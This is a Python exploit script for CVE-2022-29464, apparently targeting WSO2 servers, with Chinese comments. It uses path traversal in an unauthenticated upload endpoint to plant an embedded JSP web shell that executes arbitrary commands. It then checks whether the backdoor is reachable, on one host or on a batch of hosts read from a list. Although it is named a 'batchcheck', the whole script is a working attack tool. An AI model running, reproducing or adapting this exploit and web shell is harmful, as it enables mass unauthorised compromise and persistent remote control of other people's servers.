"""
-*- coding: utf-8 -*-
@Project : CVE-2022-29464
@Author  : wodelilian
@Date    : 2023/2/2 13:04
Software : PyCharm
version  : Python 3.10
@File    : batchcheck.py
"""
import requests, urllib3, sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def wso2_rce(pattern):
    if int(pattern) == 1:
        host = sys.argv[2]
        write_shell(host)
    else:
        hostlist = openfile(sys.argv[2])
        print("开始批量检测：")
        for host in hostlist:
            write_shell(host)


def write_shell(host):
    """
    执行CVE-2022-29464
    :param host:
    :return:
    """
    file = sys.argv[3]
    shell = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
        String cmd = request.getParameter("cmd");
        String output = "";
        if(cmd != null) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd,null,null);
                BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) { output += s+"</br>"; }
            }  catch(IOException e) {   e.printStackTrace();   }
        }
    %>
            <pre><%=output %></pre>"""
    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{file}": shell}
    try:
        requests.post(f'{host}/fileupload/toolsAny', files=files, verify=False)  # 执行payload
        shellresponse = requests.get(f"{host}authenticationendpoint/{file}")  # 检测后门是否写入成功
    except:
        print(f"{host}连接失败")
    else:
        state = shellresponse.status_code
        if state == 200:
            print("shell", state, f" @ {host}authenticationendpoint/{file}")
        else:
            print(f"{host}", state, "写入失败")


def openfile(filepath):
    """
    :param filepath: 传入读取文件地址
    :return: 返回文件中的URL
    """
    urllist = []  # 定义一个空列表用来返回URL
    with open(filepath) as f:
        for url in f.readlines():
            url = url.replace("\n", "")
            if url != "":
                urllist.append(url)
    return urllist


if __name__ == '__main__':
    if len(sys.argv) == 4:
        wso2_rce(sys.argv[1])
    else:
        print(f"Usage: python3 {sys.argv[0]} pattern(1：alone，2：batch) (host or filepath) shell.jsp")
        exit()
